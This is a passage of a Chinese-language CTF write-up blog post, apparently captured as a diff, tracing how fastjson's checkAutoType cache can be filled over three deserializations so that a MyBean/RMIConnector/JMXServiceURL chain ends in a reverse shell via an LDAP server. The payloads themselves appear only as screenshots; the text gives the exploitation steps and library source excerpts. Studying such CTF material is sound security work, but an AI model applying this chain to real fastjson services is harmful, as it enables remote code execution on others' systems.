(clazz == <span class="hljs-literal">null</span>) &#123;<br>    clazz = deserializers.findClass(typeName);<br>&#125;<br><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>    clazz = typeMapping.get(typeName);<br>&#125;<br><span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span><br>            &amp;&amp; clazz != java.util.HashMap.class<br>            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> clazz;<br>&#125;<br><span class="hljs-comment">//...🌟🌟</span><br>  <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span> &amp;&amp; (autoTypeSupport || jsonType || expectClassFlag)) &#123;<br>      <span class="hljs-type">boolean</span> <span class="hljs-variable">cacheClass</span> <span class="hljs-operator">=</span> autoTypeSupport || jsonType;<br>      clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);<br>  &#125;<span class="hljs-comment">//***处</span><br><span class="hljs-comment">//...</span><br><span class="hljs-type">JavaBeanInfo</span> <span class="hljs-variable">beanInfo</span> <span class="hljs-operator">=</span> JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy);<br>    <span class="hljs-keyword">if</span> (beanInfo.creatorConstructor != <span class="hljs-literal">null</span> &amp;&amp; autoTypeSupport) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>若没有提前退出会来到上面标识的<code>***</code>处，这里有一个很重要的操作，把还没找到的类的类名typeName添加进TypeUtils的mappings中，使用类加载器加载该类并赋值给clazz，这里可以简单看一下TypeUtils.loadClass关键部分</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span>(classLoader != <span class="hljs-literal">null</span>)&#123;<br> clazz = classLoader.loadClass(className);<br> <span class="hljs-keyword">if</span> (cache) &#123;<br>     mappings.put(className, clazz);<br> &#125;<br> <span class="hljs-keyword">return</span> clazz;<br>&#125;<br></code></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总结一下传入<code>ParserConifg#checkAutoType</code>的类名会经历以下过程</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1.</span>简单的类名检查，若处于黑名单则抛出异常 autoType is not support xxx<br><span class="hljs-number">2.</span>使用三种方法通过类名来加载类：<br>        TypeUtils.getClassFormMappings (基本都通过这个方法找到)<br>        IdentityHashMap.findClass<br>        ConcurrentHashMap.get<br><span class="hljs-number">3.</span>若找到，会进入以下<span class="hljs-keyword">if</span>进而<span class="hljs-keyword">return</span>找到的类提前退出checkAutoType函数<br><span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span><br>            &amp;&amp; clazz != java.util.HashMap.class<br>            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>    &#125;<br>    <span class="hljs-keyword">return</span> clazz;<br>&#125;<br><span class="hljs-number">4.</span>继续执行，通过TypeUtils的loadClass方法利用类加载器找到类，并将当前类加入TypeUtils的mappings中<br><span class="hljs-number">5.</span>调用JavaBeanInfo的build方法，传入当前类，当类没有无参构造函数时会抛出异常 <span class="hljs-keyword">default</span> constructor not found. xxxx<br></code></pre></td></tr></table></figure>
+
+<h3 id="第一次反序列化"><a href="#第一次反序列化" class="headerlink" title="第一次反序列化"></a>第一次反序列化</h3><p>首先是入口点</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">objectInputStream.readObject();<br></code></pre></td></tr></table></figure>
+
+<p>接着来到JSONArray#readObject</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> java.io.ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>      JSONObject.SecureObjectInputStream.ensureFields();<br>      <span class="hljs-keyword">if</span> (JSONObject.SecureObjectInputStream.fields != <span class="hljs-literal">null</span> &amp;&amp; !JSONObject.SecureObjectInputStream.fields_error) &#123;<br>          <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">secIn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>.SecureObjectInputStream(in);<br>          <span class="hljs-keyword">try</span> &#123;<br>              secIn.defaultReadObject();<br>              <span class="hljs-keyword">return</span>;<br>          &#125; <span class="hljs-keyword">catch</span> (java.io.NotActiveException e) &#123;<br>              <span class="hljs-comment">// skip</span><br>          &#125;<br>      &#125;<br>  <span class="hljs-comment">//。。。</span><br></code></pre></td></tr></table></figure>
+
+<p>之后就被<code>SecureObjectInputStream</code>劫持了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050237433.png" srcset="/img/loading.gif" lazyload alt="image-20230505020221637"></p>
+<p>直接来到最关键的checkAutoType方法，可以看到先找的是MyBean</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050237274.png" srcset="/img/loading.gif" lazyload alt="image-20230505020313917"></p>
+<p>跟进checkAutoType方法，前面部分跳过，直接来个经典三个方法寻找类</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050237845.png" srcset="/img/loading.gif" lazyload alt="image-20230505020425672"></p>
+<p>这里可以先跟进一下getClassFromMapping方法，可以看到此时的Mappings（size：107）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050237915.png" srcset="/img/loading.gif" lazyload alt="image-20230505020521779"></p>
+<p>经过三个方法，仍然没有找到类，这也就意味着接下来一定会去到JavaBeanInfo的build方法中(异常抛出点)，不过在这之前会先通过Typeutils的loadClass方法找到类，并添加mappings的数量</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span> &amp;&amp; (autoTypeSupport || jsonType || expectClassFlag)) &#123;<br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">cacheClass</span> <span class="hljs-operator">=</span> autoTypeSupport || jsonType;<br>    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>MyBean被添加，size变为108</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050238540.png" srcset="/img/loading.gif" lazyload alt="image-20230505020903956"></p>
+<p>之后就来到了这个死亡异常抛出点JavaBeanInfo的build方法，但你会惊奇的发现，并没有抛出异常，程序继续走到了下一个类RMIConnector传入checkAutoType方法，其实是因为这个if的条件不满足，build函数提前返回</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050238797.png" srcset="/img/loading.gif" lazyload alt="image-20230505021125948"></p>
+<blockquote>
+<p>这也很好理解，那个异常提示的很明显了<code>default constructor not found. class xxx</code>而MyBean明显是有无参构造方法的，这里的defaultConstructor就是获取到了无参构造方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050238509.png" srcset="/img/loading.gif" lazyload alt="image-20230505015849391"></p>
+</blockquote>
+<p>没有异常抛出，无事发生，接着轮到RMIConnector</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050247946.png" srcset="/img/loading.gif" lazyload alt="image-20230505021320328"></p>
+<p>后面都是一样的操作，三个方法都找不到类，被添加进mappings，size+1</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050238031.png" srcset="/img/loading.gif" lazyload alt="image-20230505021419699"></p>
+<p>然后来到死亡异常抛出点JavaBeanInfo的build方法，没有无参构造函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050238335.png" srcset="/img/loading.gif" lazyload alt="image-20230505021538934"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239359.png" srcset="/img/loading.gif" lazyload alt="image-20230505021549225"></p>
+<p>迎来第一次报错</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239280.png" srcset="/img/loading.gif" lazyload alt="image-20230505021625294"></p>
+<h3 id="第二次反序列化"><a href="#第二次反序列化" class="headerlink" title="第二次反序列化"></a>第二次反序列化</h3><p>接着进行第二次，发送payload</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239992.png" srcset="/img/loading.gif" lazyload alt="image-20230505021702771"></p>
+<p>MyBean和RMIConnector的checkAutoType就先跳过，这两类以及被加入mappings了，是可以通过三个方法后的这部分代码提前退出的,就不再跟进</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span><br>            &amp;&amp; clazz != java.util.HashMap.class<br>            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> clazz;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>直接开始分析JMXServiceURL，三个方法找不到类，调用laodClass</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239172.png" srcset="/img/loading.gif" lazyload alt="image-20230505021939903"></p>
+<p>加入mappings， size+1，至此，可以支持反序列化成功的mappigns已经装填好</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239392.png" srcset="/img/loading.gif" lazyload alt="image-20230505022008745"></p>
+<p>之后又因为没有无参构造方法抛出异常</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239543.png" srcset="/img/loading.gif" lazyload alt="image-20230505022107758"></p>
+<p>迎来第二个报错</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239596.png" srcset="/img/loading.gif" lazyload alt="image-20230505022142322"></p>
+<h3 id="第三次反序列化（也是反序列化成功的开始）"><a href="#第三次反序列化（也是反序列化成功的开始）" class="headerlink" title="第三次反序列化（也是反序列化成功的开始）"></a>第三次反序列化（也是反序列化成功的开始）</h3><p>先提前架起ldap服务和vps监听</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050239279.png" srcset="/img/loading.gif" lazyload alt="image-20230505022409515"></p>
+<p>发送payload</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050240664.png" srcset="/img/loading.gif" lazyload alt="image-20230505022432324"></p>
+<p>通过了前面三个类的checkAutoType方法，来到BadAttributeValueExpException的readObject方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050240513.png" srcset="/img/loading.gif" lazyload alt="image-20230505022631154"></p>
+<p>接着触发getter</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050240832.png" srcset="/img/loading.gif" lazyload alt="image-20230505022649684"></p>
+<p>成功反弹shell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305050240730.png" srcset="/img/loading.gif" lazyload alt="image-20230505022721373"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web/">#web</a>
+      
+        <a href="/tags/java/">#java</a>
+      
+        <a href="/tags/fastjson/">#fastjson</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>[aliyun CTF] ezbean分析与思考</div>
+      <div>http://sloth31.github.io/2023/05/05/ezbean分析与思考/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Sloth</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年5月5日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+              <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                <i class="iconfont icon-nc"></i>
+              </span>
+              </a>
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+              <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                <i class="iconfont icon-sa"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/01/30/Hessian%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Hessian反序列化">
+                        <span class="hidden-mobile">Hessian反序列化</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
